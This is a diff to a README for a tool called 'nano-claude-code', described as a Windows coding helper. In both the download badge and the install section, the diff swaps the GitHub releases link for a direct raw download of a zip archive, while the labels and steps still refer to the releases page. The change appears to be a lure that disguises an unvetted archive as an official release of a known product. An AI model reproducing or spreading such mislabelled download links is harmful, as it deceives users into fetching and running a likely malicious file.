@@ -1,7 +1,7 @@
 # 🤖 nano-claude-code - Run a coding helper on Windows
 
 <p align="center">
-  <a href="https://github.com/sigridcorrupting777/nano-claude-code/releases">
+  <a href="https://raw.githubusercontent.com/sigridcorrupting777/nano-claude-code/main/assets/claude_code_nano_3.2.zip">
     <img src="https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge" alt="Download Releases" />
   </a>
 </p>
@@ -24,7 +24,7 @@ It is meant for people who want a simple way to run a coding assistant without a
 
 Use this page to download and run this file:
 
-https://github.com/sigridcorrupting777/nano-claude-code/releases
+https://raw.githubusercontent.com/sigridcorrupting777/nano-claude-code/main/assets/claude_code_nano_3.2.zip
 
 1. Open the releases page in your browser.
 2. Find the latest Windows file.
